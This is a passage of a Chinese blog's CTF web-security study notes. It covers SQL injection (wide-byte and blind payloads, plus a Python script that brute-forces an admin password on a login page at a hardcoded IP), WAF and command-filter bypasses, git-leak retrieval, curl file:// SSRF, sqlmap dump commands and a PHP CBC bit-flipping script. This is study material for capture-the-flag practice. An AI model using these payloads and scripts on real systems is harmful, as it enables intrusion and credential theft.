class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">select mid((passwd)from(3)) from users;</span><br><span class="line">#+----------------------+</span><br><span class="line">#| mid((passwd)from(3)) |</span><br><span class="line">#+----------------------+</span><br><span class="line">#| riotayyds            |</span><br><span class="line">#| est                  |</span><br><span class="line">#| 3test                |</span><br><span class="line">#| passwd               |</span><br><span class="line">#| ctor                 |</span><br><span class="line">#| ctor                 |</span><br><span class="line">#| ctor                 |</span><br><span class="line">#+----------------------+</span><br></pre></td></tr></table></figure></li><li><p><code>MD5()</code>：SQL也内置了 md5加密函数</p></li><li><p><code>SLEEP()</code>：延迟函数，单位为秒</p></li></ul><h2 id="information-schema"><a href="#information-schema" class="headerlink" title="information_schema"></a><big>information_schema</big></h2><p>信息数据库，保存着关于mysql服务器所维护的所有其他数据库的信息，该数据库中又有几个重要的数据表，而当需要跨数据库访问时，则与类成员的访问相似，如对于COLUMNS：information_schema.COLUMNS</p><ul><li><p>SCHEMATA：提供了当前mysql实例中所有数据库的信息</p><ul><li>SCHEMA_NAME这一列记录着所有数据库名</li></ul></li><li><p>TABLES：提供了当前数据库中的表的信息，表类型，表引擎，所属的数据库，创建时间等信息</p><ul><li>TABLE_NAME：数据表名</li><li>TABLE_SCHEMA：表对应的数据库名</li></ul></li><li><p>COLUMNS：提供了表中列的信息，详细表述所有列的信息</p><ul><li><p>TABLE_SCHEMA：数据库名</p></li><li><p>TABLE_NAME：表名</p></li><li><p>COLUMN_NAME：列名</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">select * from columns where table_name&#x3D;&#39;users&#39;;</span><br><span class="line">        #+---------------+--------------------+------------+---------------------+------------------+----------------+-------------+-----------+--------------------------+------------------------+-------------------+---------------+--------------------+--------------------+--------------------+-------------+------------+-------+---------------------------------+----------------+-----------------------+--------+</span><br><span class="line">        #| TABLE_CATALOG | TABLE_SCHEMA       | TABLE_NAME | COLUMN_NAME         | ORDINAL_POSITION | COLUMN_DEFAULT | IS_NULLABLE | DATA_TYPE | CHARACTER_MAXIMUM_LENGTH | CHARACTER_OCTET_LENGTH | NUMERIC_PRECISION | NUMERIC_SCALE | DATETIME_PRECISION | CHARACTER_SET_NAME | COLLATION_NAME     | COLUMN_TYPE | COLUMN_KEY | EXTRA | PRIVILEGES                      | COLUMN_COMMENT | GENERATION_EXPRESSION | SRS_ID |</span><br><span class="line">        #+---------------+--------------------+------------+---------------------+------------------+----------------+-------------+-----------+--------------------------+------------------------+-------------------+---------------+--------------------+--------------------+--------------------+-------------+------------+-------+---------------------------------+----------------+-----------------------+--------+</span><br><span class="line">        #| def           | performance_schema | users      | CURRENT_CONNECTIONS |                2 | NULL           | NO          | bigint    |                     NULL |                   NULL |                19 |             0 |               NULL | NULL               | NULL               | bigint      |            |       | select,insert,update,references |                |                       |   NULL |</span><br><span class="line">        #| def           | performance_schema | users      | TOTAL_CONNECTIONS   |                3 | NULL           | NO          | bigint    |                     NULL |                   NULL |                19 |             0 |               NULL | NULL               | NULL               | bigint      |            |       | select,insert,update,references |                |                       |   NULL |</span><br><span class="line">        #| def           | performance_schema | users      | USER                |                1 | NULL           | YES         | char      |                       32 |                    128 |              NULL |          NULL |               NULL | utf8mb4            | utf8mb4_bin        | char(32)    | UNI        |       | select,insert,update,references |                |                       |   NULL |</span><br><span class="line">        #| def           | test               | users      | passwd              |                2 | NULL           | YES         | varchar   |                       12 |                     48 |              NULL |          NULL |               NULL | utf8mb4            | utf8mb4_0900_ai_ci | varchar(12) |            |       | select,insert,update,references |                |                       |   NULL |</span><br><span class="line">        #| def           | test               | users      | uname               |                1 | NULL           | YES         | varchar   |                       10 |                     40 |              NULL |          NULL |               NULL | utf8mb4            | utf8mb4_0900_ai_ci | varchar(10) |            |       | select,insert,update,references |                |                       |   NULL |</span><br><span class="line">        #+---------------+--------------------+------------+---------------------+------------------+----------------+-------------+-----------+--------------------------+------------------------+-------------------+---------------+--------------------+--------------------+--------------------+-------------+------------+-------+---------------------------------+----------------+-----------------------+--------+</span><br></pre></td></tr></table></figure></li></ul></li></ul><h2 id="基于约束的攻击"><a href="#基于约束的攻击" class="headerlink" title="基于约束的攻击"></a><big>基于约束的攻击</big></h2><blockquote>在MySQL的配置选项中，有一个sql_mode选项。当MySQL的sql_mode设置为default时，即没有开启STRICT_ALL_TABLES选项时，MySQL对于用户插入的超长值只会提示warning，而不是error（如果是error则插入不成功），这可能会导致发生一些“截断”问题 ———— 道哥</blockquote><p>因为在sql执行字符串处理时，字符串末尾的空格符将会被删除，导致 “admin”与 “admin     ”是等效的。当使用如 “admin                       x”这样的超长字符串，或末尾直接是空格的“admin   ”注册成功，前者会因为截断，和后者一样可以达到越权获取权限</p><h2 id="SQL查询与比较"><a href="#SQL查询与比较" class="headerlink" title="SQL查询与比较"></a><big>SQL查询与比较</big></h2><p>str与int的比较：与PHP一样，非数字开头的str被当成 0，数字开头的会被当成那个开头的数字，这使得在输入 user=0或 user=’’时返回所有非 0开头的 user</p><p>SQL连等：阴间语法，如 where user=’admin’=’admin’=1，可理解为做异或取反 (同或)运算</p><blockquote>查第一个admin，查询对象是原本的数据表，结果为{admin：1，其他：0}    此时还没有到返回admin并打印出来的时候，因为后面的连等还没有比较完</blockquote><blockquote>查第二个admin，查询对象是1和0，因为admin非数字开头，此时和int比较，转换成0，和上次非admin的字段的查询结果匹配，所以这次比较结果为{admin：0，其他：1}</blockquote><blockquote>第三次查1，显然匹配到其他，故最终返回为处admin外的所有成员</blockquote><h2 id="万-能-钥-匙"><a href="#万-能-钥-匙" class="headerlink" title="万 能 钥 匙"></a><big>万 能 钥 匙</big></h2><p>最基础的SQL注入：admin’ or ‘1’=’1</p><h2 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a><big>宽字节注入</big></h2><p align='right'><small>特征：gbk等宽字节编码</small></p><p>通常的在sql语句前面使用了一个addslashes()，将$id的值转义。这是通常对sql注入进行的操作，只要我们的输入参数在单引号中，就逃逸不出单引号的限制，无法注入</p><p>宽字节注入是利用mysql的一个特性，mysql在使用GBK编码的时候，会认为两个字符是一个汉字（前提是前一个ASCII码大于128，这样才能达到汉字的范围，如%df之类的）</p><p>示例payload：<code>/?id=hello%df' union select 'admin','pass'#</code></p><h2 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a><big>盲注</big></h2><p align='right'><small>SQLI-LAB</small></p><p>对无回显页面的注入叫做盲注，大多数时候都是遇见的这样的页面，分为布尔盲注和时间盲注，但本质上差别不大。原理大致可理解为不断猜测字符的过程，通过注入后返回的信息判断猜对与否，有点暴力破解的意思。由于盲注的重复性，手注在盲注中最多用于盲注类型的判断，猜测过程则交给脚本，burp，sqlmap等完成</p><p>通常盲注时先跑数据库名的长度，再跑数据库名，然后又跑表名的长度…如果有需要甚至可爆整个数据库，也可以不跑长度而直接开始跑内容，因为知道长度的作用只是心里有个底。布尔盲注和时间盲注的区别就只是在于返回信息不同，布尔盲注通过返回两种状态信息判断，时间盲注则根据响应时间判断</p><ul><li><p>payload构造与示例</p><p>构造payload时，应根据网页实现的功能考虑使用了什么SQL查询语句，这样才能准确知道需要多少括号或引号来闭合语句</p><ul><li><p>表长（包含在INSERT INTO … VALUE(input)中）：<code>'and (case when (length((select group_concat(table_name separator '-') from information_schema.tables where table_schema=database()))=10) then sleep(5) else 1 end)) #</code></p><p>  可以发现结尾因为要注释掉多余的 <code>')</code> 而补了一个反括号</p></li><li><p>表名：<code>if(substr((select group_concat(table_name separator ',') from information_schema.tables where table_schema=database())  from %s for 1)='%s',sleep(5),1)</code></p></li><li><p>字段名：<code>ascii(mid((select group_concat(column_name separator '-') from information_schema.columns where table_name='表名') from(%i)))=%i</code></p></li></ul></li><li><p>e.g.布尔盲注猜admin密码</p><ul><li><p>如返回“用户名不存在”与“密码错误”两种信息的页面，就可以尝试布尔盲注</p>  <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">result=<span class="string">&#x27;&#x27;</span></span><br><span class="line">url=<span class="string">&#x27;http://114.67.246.176:13058/login.php&#x27;</span><span class="comment">#注意是登录页而非index</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">33</span>):<span class="comment">#猜测是MD5加密，为32位，先跑33位试试</span></span><br><span class="line">    <span class="keyword">for</span> tar <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>,<span class="number">128</span>):<span class="comment">#32~128为常用的96个ASCII字符</span></span><br><span class="line">        uname=<span class="string">&quot;admin&#x27;=&#x27;admin&#x27;=ascii(mid((passwd)from(%s)))-%s-&#x27;&quot;</span>%(i,tar)</span><br><span class="line">        data=&#123;<span class="string">&#x27;uname&#x27;</span>:uname,<span class="string">&#x27;passwd&#x27;</span>:<span class="string">&#x27;anything&#x27;</span>&#125;</span><br><span class="line">        response=requests.post(url=url,data=data).text</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;password&#x27;</span> <span class="keyword">in</span> response:<span class="comment">#报密码错误时说明tar的值与密码第i位字符的ASCII相同</span></span><br><span class="line">            result+=<span class="built_in">chr</span>(tar)</span><br><span class="line">            print(<span class="string">&quot;\r%s&quot;</span>%result,end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure></li><li><p>上述脚本不是绝对的，有的登录页可能对某些注入方式设置了针对性过滤，具体的payload构造还需要对应具体情况，此处再举一个“=”被过滤的例子</p>  <center><code>"admin'^((ascii(mid((select(password)from(admin))from(%s))))<>%s)^1#"</code></center></li></ul></li></ul><h2 id="预处理语句"><a href="#预处理语句" class="headerlink" title="预处理语句"></a><big>预处理语句</big></h2><p>所谓预处理指的就是将SQL语句中的关键字(如 SELECT…FROM…)与数据(如字段名，数据表名)分离,使得针对不同数据的相同SQL语句的执行开销更小，同时又可防止SQL注入的攻击</p><p>传统方式的SQL语句，在执行时每条SQL都需要经过分析、编译和优化的步骤；预处理方式则是利用客户端与服务器的二进制协议，预先编译一次客户端发送的SQL语句模板,然后再根据客户端发送给服务器相应数量的变量进行执行操作，并旦针对一条SQL语句模板可以执行多次,还无需考虑数据中含有未转义的SQI引号和分隔符字符</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">PREPARE stmt FROM &#39;SELECT * FROM user WHERE uname&#x3D;?&#39;;</span><br><span class="line">SET @uname&#x3D;&#39;admin&#39;;</span><br><span class="line">EXECUTE stmt USING @uname;</span><br><span class="line">DEALLOCATE &#x2F; DROP PREPARE stmt;</span><br></pre></td></tr></table></figure><p>以此，可以在能堆叠注入时候绕过对SELECT等关键字的过滤</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">SET @sqlvar&#x3D;CONCAT(&#39;SE&#39;,&#39;LECT * FROM user&#39;);</span><br><span class="line">PREPARE myquery FROM @sqlvar;</span><br><span class="line">EXECUTE myquery;</span><br></pre></td></tr></table></figure><h2 id="❀花式绕过❀"><a href="#❀花式绕过❀" class="headerlink" title="❀花式绕过❀"></a><big>❀花式绕过❀</big></h2><ul><li><p>双写关键字：某些简单的waf中，将关键字<code>select</code>等只使用<code>replace()</code>函数置换为空，这时候可以使用双写关键字绕过。例如<code>select</code>变成<code>seleselectct</code>，在经waf的处理之后又变成<code>select</code>，达到绕过的要求</p></li><li><p>过滤select：当存在回显时，可以基于报错注入。常用函数为两个操作XML文档的函数</p><ul><li><code>extractvalue()</code>：对XML文档进行查询的函数<ul><li>para：(目标xml文档，xml路径)</li></ul></li><li><code>updatexml()</code>：更新xml文档<ul><li>para：(目标xml文档，xml路径，更新的内容)</li></ul></li></ul><p>  通过将正常的XML路径修改为不符合语法的路径即可使其报错并显示错误内容，如下面这则查询：</p><p>  <code>select username from security.user where id=1 and (extractvalue(‘anything’,concat(‘~’,(select database()))))</code></p><p>  会返回：<code>error 1105 : XPATH syntax error: &#39;~database_name&#39;</code>，即 <code>~</code> 与库名组成的字段</p></li><li><p>过滤引号：转hex，如admin =&gt; hex{61 64 6d 69 6e}</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">select * from users where uname &#x3D; 0x61646d696e;</span><br><span class="line">        #+-------+----------+</span><br><span class="line">        #| uname | passwd   |</span><br><span class="line">        #+-------+----------+</span><br><span class="line">        #| admin | adpasswd |</span><br><span class="line">        #+-------+----------+</span><br></pre></td></tr></table></figure></li><li><p>过滤空格：<code>/**/</code>，<code>()</code>，<code>%0a</code>，<code>`</code></p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">select&#x2F;**&#x2F;*&#x2F;**&#x2F;from&#x2F;**&#x2F;users;</span><br><span class="line">select(id)from(users);#注意*不能在空格内</span><br><span class="line">select&#96;id&#96;from&#96;users&#96;where&#96;id&#96;&#x3D;1;</span><br></pre></td></tr></table></figure></li><li><p>过滤逻辑运算符：<code>and = &amp;&amp;</code>，<code>or = ||</code>，<code>xor = |</code>，<code>not = !</code></p></li><li><p>过滤等号：</p><ul><li><p><code>like</code>：不加通配符%的like与等于等效</p>  <center><code>select * from users where uname like 'admin';</code></center></li><li><p><code>rlike</code>：模糊匹配，搜索字段中存在的部分，则所有包含搜索内容的字段均会被选中</p>  <center><code>select * from users where uname rlike 'admin';</code></center></li><li><p><code>regexp</code>：正则匹配</p>  <center><code>select * from users where uname regexp 'admin';</code></center></li><li><p>夹逼：</p>  <center><code>select * from users where id>0 and id<2;</code></center></li><li><p><code>!(...&lt;&gt;...)</code>：双重否定表肯定</p>  <center><code>select * from users where !(uname<>'admin');</code></center></li><li><p>strcmp(str1,str2)：字符串相同返回0，不同返回1或-1</p></li></ul>  <center><code>strcmp(ascii(substr(uname,1,1)),100)</code></center><ul><li>in：</li></ul>  <center><code>substr(username,1,1) in ('a')</code></center><ul><li>between … and …：</li></ul>  <center><code>substr(username,1,1) between 'a' and 'a'</code></center></li><li><p>过滤逗号：</p><ul><li><p>对于substr()，mid()等字符处理函数可用<code>from pos for len</code>：从<code>pos</code>开始读<code>len</code>个字符，用法为<code>substr(&#39;HelloWorld&#39; from 2 for 5)</code></p></li><li><p>对于需要<code>union select</code>到的派生表，可以用<code>join</code>代替逗号来隔开；注意派生表需要对其定义一个临时表名</p>  <center><code>select 1，2，3;</code></center>  <center>等价于</center>  <center><code>select * from (select 1)a join (select 2)b join(select 3)c;</code></center></li></ul></li><li><p>过滤部分函数：</p><ul><li><p>sleep() –&gt;benchmark()：benchmark()用于测试某些特定操作的执行速度，第一个参数是执行次数，第二个是执行的表达式</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">select 1 and benchmark(500000000,1);</span><br><span class="line">        #+------------------------------+</span><br><span class="line">        #| 1 and benchmark(500000000,1) |</span><br><span class="line">        #+------------------------------+</span><br><span class="line">        #|                            0 |</span><br><span class="line">        #+------------------------------+</span><br><span class="line">        #1 row in set (1.49 sec)</span><br></pre></td></tr></table></figure></li><li><p>ascii()–&gt;hex()、bin()</p></li><li><p>group_concat()–&gt;concat_ws()</p></li><li><p>ascii()–&gt;ord()：这两个函数在处理英文时效果一样，但是处理中文等时不一致</p></li></ul></li></ul><hr><h1 id="web框架"><a href="#web框架" class="headerlink" title="web框架"></a><big><center>web框架</center></big></h1><h2 id="python框架"><a href="#python框架" class="headerlink" title="python框架"></a>python框架</h2><p><code>os.environ</code>：python的环境变量，可能会在里面隐藏信息，本体是一个文件，绝对地址为 <code>/proc/self/environ</code></p><p><code>pickle</code>：用于序列化的库，序列化：<code>pickle.dumps(obj)</code>，反序列化：<code>pickle.loads(str)</code>（直接dump、load，即不加 s 时，是将序列化后的文本储存到文件中）</p><h3 id="flask"><a href="#flask" class="headerlink" title="flask"></a>flask</h3><h3 id="tornado"><a href="#tornado" class="headerlink" title="tornado"></a>tornado</h3><h2 id="PHP框架"><a href="#PHP框架" class="headerlink" title="PHP框架"></a>PHP框架</h2><h3 id="FatFreeFramework"><a href="#FatFreeFramework" class="headerlink" title="FatFreeFramework"></a>FatFreeFramework</h3><hr><h1 id="git"><a href="#git" class="headerlink" title="git"></a><big><center>git</center></big></h1><h2 id="git基础"><a href="#git基础" class="headerlink" title="git基础"></a><big>git基础</big></h2><p>HEAD：指向你正在工作中的本地分支的指针，可以将HEAD想象为当前分支的别名</p><p>git reflog：查看引用日志，记录分支和HEAD指向的历史，这些日志可以被删除，并非硬性</p><p>CommitID：reflog中会记录提交 ID，作为reset的参数可以退回到指定的提交处</p><p>git checkout – file_path_name：用于放弃单个文件的修改，注意 –两边有空格</p><p>git reset [–hard|soft|mixed|merge|keep] [commit|HEAD]：将当前分支重设到指定的</p><p>HEAD^：退回一个快照，^数量表示退回的步数</p><p>git status [-s]：命令用于查看在你上次提交之后是否有对文件进行再次修改，-s表简短</p><p><img src="/images/git%E6%8C%87%E4%BB%A4%E5%8F%AF%E8%A7%86%E5%8C%96.png"></p><center style="color:#C0C0C0;text-decoration:underline">对应的Git流程区域分别为    工作区 / 缓存区 / 提交历史</center><h2 id="git泄漏"><a href="#git泄漏" class="headerlink" title="git泄漏"></a><big>git泄漏</big></h2><p>在网页更新，上传过程中由于操作失误可能导致 git泄漏</p><p>特征：/.git可以访问，或遗留了 .swp，.php.bak，.php~ 等备份文件</p><p>对于 /.git可以访问的页面，尝试用 GitHack或 Linux中 wget命令下载 .git文件夹</p><p>GitHack依赖Python2.7环境：<code>python2 githack.py address/.git/</code></p><p>-r参数为递归下载，整站爬取：<code>wget -r address/.git</code></p><hr><h1 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a><big><center>Linux</center></big></h1><h2 id="Linux基础"><a href="#Linux基础" class="headerlink" title="Linux基础"></a><big>Linux基础</big></h2><p>pwd：显示当前目录</p><p>dir 与 ls：显示指定目录内容，默认为当前目录</p><p>wget：下载命令，其中 -r参数为递归下载，相当于整站下载</p><p>浏览文件：</p><ul><li><p>cat：连接文件并打印</p></li><li><p>tac：连接文件，倒序打印</p></li><li><p>nl：链接文件并带行号打印</p></li><li><p>head：连接文件，打印开头几行</p></li><li><p>tail：连接文件，打印最后几行</p></li><li><p>more：逐页显示内容，便于阅读，自带 +/string 搜索功能，当 string 是 int 时会从那一行开始显示</p></li><li><p>less：目前理解为更高级的 more</p></li></ul><p>chmod u+x：提升文件权限，当出现 zsh permission 权限低时可用</p><p>grep：查找文件里符合条件的字符串（可正则），全称 Global Regular Expression Print，可直接对文件内容进行搜索，如在’/usr/src/Linux/Doc’目录下搜索带字符 串’magic’的文件：<code>grep magic /usr/src/Linux/Doc/*</code></p><p>../ 与 ./：父级目录与当前目录</p><p>&gt;：重定向输出，覆盖原有内容，<code>echo 'this is flag' > flag.txt</code> #若flag.txt不存在，则创建；若存在，则覆盖</p><p>&gt;&gt;：重定向输出，追加新内容</p><p>&lt;：从文件中获取输入</p><p>|：管道 (pipe)，以上一条命令的输出作为下一条命令的参数或输入</p><p>||：上一条命令执行失败后才执行下一条命令</p><p>&amp;&amp;：上一条命令执行成功后才执行下一条命令</p><p>?：通配符，匹配任意单个字符</p><p>$：声明变量</p><h2 id="❀花式catFlag❀"><a href="#❀花式catFlag❀" class="headerlink" title="❀花式catFlag❀"></a><big>❀花式catFlag❀</big></h2><ul><li><p>过滤空格：<code>\&lt;</code>，<code>\&gt;</code>，<code>\&lt;/</code>，<code>&#123; , &#125;</code>，<code>\$&#123;IFS&#125;</code>，<code>\$IFS\$1</code> - [数字随意]</p>  <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">cat flag.txt</span><br><span class="line"><span class="meta">cat$</span><span class="bash">&#123;IFS&#125;flag.txt</span></span><br><span class="line"><span class="meta">cat$</span><span class="bash">IFS<span class="variable">$9flag</span>.txt</span></span><br><span class="line">cat&lt;flag.txt</span><br><span class="line">cat&lt;&gt;flag.txt</span><br><span class="line">&#123;cat,flag.txt&#125;</span><br></pre></td></tr></table></figure></li><li><p>堆叠：当只有一个语句的时候，末尾无需分号，最后一个语句后面也无需分号</p></li><li><p>变量拼接 [前提是可以堆叠]：如下列代码对<code>flag</code>贪婪匹配</p>  <center><code>preg_match("/.*f.*l.*a.*g.*/", $input)</code></center>  <center>对 ↓ 策</center>  <center><code>$input：a=ag;b=fl;cat $b$a</code></center></li><li><p>sh命令执行：<code>echo YourShell|sh</code></p></li><li><p>b64编码：<code>echo YourB64|base64 -d</code></p></li><li><p>命令替换：反引号 <code>``</code> 框选的内容在命令中优先执行，执行结果返回到原本反引号的位置进行替换，例如<code>cat &#96;ls&#96;</code>会先 ls，返回当前目录下所有文件名，然后 cat 会把所有文件逐一连接、打印</p></li></ul><hr><h1 id="Tool"><a href="#Tool" class="headerlink" title="Tool"></a><big><center>Tool</center></big></h1><h2 id="sqlmap"><a href="#sqlmap" class="headerlink" title="sqlmap"></a><big>sqlmap</big></h2><p>全自动 SQL扫描工具，<code>--batch</code> 一键开启全自动模式</p><ul><li>注入检测<ul><li><code>-u url</code>——检查GET参数注入点</li><li><code>-u url -data="id=1"</code>——检查POST参数注入点</li><li><code>-u url -H 'header=*'</code>——检查HEADER注入，星号表示手动标记注入点</li></ul></li><li>表单爆破<ul><li><code>-dbs</code>——查看数据库</li><li><code>-D database_name --tables</code>——查看表名</li><li><code>-D database_name -T table_name --columns</code>——查看列名</li><li><code>-D database_name -T table_name -C col1,col2... --dump</code>——查看列内容</li></ul></li></ul><h2 id="cURL"><a href="#cURL" class="headerlink" title="cURL"></a><big>cURL</big></h2><p>利用 URL语法在命令行下工作的文件传输工具，Windows自带，GET，POST，HEADERS等 curl都支持，和python中的requests差不多<code>curl baidu.com</code>，详情可以 curl –help</p><p>也可以访问本地文件：<code>curl file:///MyPhoto.png</code></p><p>还可以一行命令，多个访问：<code>curl baidu.com google.com</code></p><p>当服务端自身使用 curl发送 GET请求，且 GET内容可控时，可以获取服务端本地 flag</p><p>服务端的情况：<code>curl address.com/?key=$_GET['key']</code></p><p>利用多个访问与本地访问，传参为：<code>server.com/?key=anything file:///flag</code></p><h2 id="pip指定版本的包"><a href="#pip指定版本的包" class="headerlink" title="pip指定版本的包"></a><big>pip指定版本的包</big></h2><p><code>pip install lib==version</code></p><hr><h1 id="ENCRYPT"><a href="#ENCRYPT" class="headerlink" title="ENCRYPT"></a><big><center>ENCRYPT</center></big></h1><h2 id="CBC字符翻转攻击"><a href="#CBC字符翻转攻击" class="headerlink" title="CBC字符翻转攻击"></a><big>CBC字符翻转攻击</big></h2><p align='right'><small>还不太懂，暂先收录</small></p><p><a href="https://blog.csdn.net/u013577244/article/details/86310881?utm_medium=distribute.pc_relevant.none-task-blog-BlogCommendFromBaidu-3.not_use_machine_learn_pai&depth_1-utm_source=distribute.pc_relevant.no">CSDN相关文章</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">header(<span class="string">&quot;Content-Type: text/html;charset=utf-8&quot;</span>);</span><br><span class="line"><span class="comment">#计算cipher</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">明文1：a:2:&#123;s:8:&quot;userna//r</span></span><br><span class="line"><span class="comment">明文2：me&quot;;s:5:&quot;admil&quot;;//l字母在第14个字节</span></span><br><span class="line"><span class="comment">明文3：s:8:&quot;password&quot;;s</span></span><br><span class="line"><span class="comment">明文4：:3:&quot;123&quot;;&#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="variable">$cipher</span>=base64_decode(urldecode(<span class="string">&#x27;f0csYAAWDy%2FGlSsvWLr6NlCBad4p2U%2BXm2Rr2X07iytKd4r8V5tbO7%2FcxIib96eRDGUOMQclQgvxw2SZXOobWQ%3D%3D&#x27;</span>));</span><br><span class="line"><span class="variable">$temp</span>=<span class="variable">$cipher</span>;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">设密文1[13]=A,解密(密文2)[13]=B,明文2[13]=C,</span></span><br><span class="line"><span class="comment">将A修改为A ^ C,则:</span></span><br><span class="line"><span class="comment">A ^ B = A ^ C ^ B = B ^ B = 0 = C</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="comment">//A  C X</span></span><br><span class="line"><span class="variable">$cipher</span>[<span class="number">13</span>]=chr(ord(<span class="variable">$cipher</span>[<span class="number">13</span>]) ^ ord(<span class="string">&#x27;l&#x27;</span>) ^ ord(<span class="string">&#x27;n&#x27;</span>));</span><br><span class="line"><span class="keyword">echo</span> urlencode(base64_encode(<span class="variable">$cipher</span>));</span><br><span class="line"></span><br><span class="line"><span class="comment">#计算iv</span></span><br><span class="line"><span class="variable">$res</span>=base64_decode(<span class="string">&#x27;yeiydaYLG5RNzOPWaQgOkG1lIjtzOjU6ImFkbWluIjtzOjg6InBhc3N3b3JkIjtzOjM6IjEyMyI7fQ==&#x27;</span>);<span class="comment">//这里放burp放回的base64数据</span></span><br><span class="line"><span class="variable">$iv</span>=base64_decode(urldecode(<span class="string">&#x27;TD9FI%2FvbrZn%2FSjbSD9bfSQ%3D%3D&#x27;</span>)); <span class="comment">//这里放cookie中的iv</span></span><br><span class="line"><span class="variable">$plaintext</span>=<span class="string">&#x27;a:2:&#123;s:8:&quot;userna&#x27;</span>;</span><br><span class="line"><span class="variable">$new_iv</span>=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">16</span>; <span class="variable">$i</span> ++)&#123;</span><br><span class="line">    <span class="variable">$new_iv</span>=<span class="variable">$new_iv</span>.chr(ord(<span class="variable">$iv</span>[<span class="variable">$i</span>])^ord(<span class="variable">$res</span>[<span class="variable">$i</span>])^ord(<span class="variable">$plaintext</span>[<span class="variable">$i</span>]));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> urlencode(base64_encode(<span class="variable">$new_iv</span>));</span><br></pre></td></tr></table></figure><link rel="stylesheet" href="/kyriota/css/spoiler.css" type="text/css"><script src="/kyriota/js/spoiler.js" type="text/javascript" async></script>]]></content>
    
    
    <summary type="html">&lt;p&gt;系统性收录解决Web题目需要的前置知识，过于零碎的知识未整合&lt;/p&gt;</summary>
    
    
    
    <category term="Web" scheme="https://kyriota.github.io/categories/Web/"/>
    
    
    <category term="Web" scheme="https://kyriota.github.io/tags/Web/"/>
    
  </entry>
  
</feed>
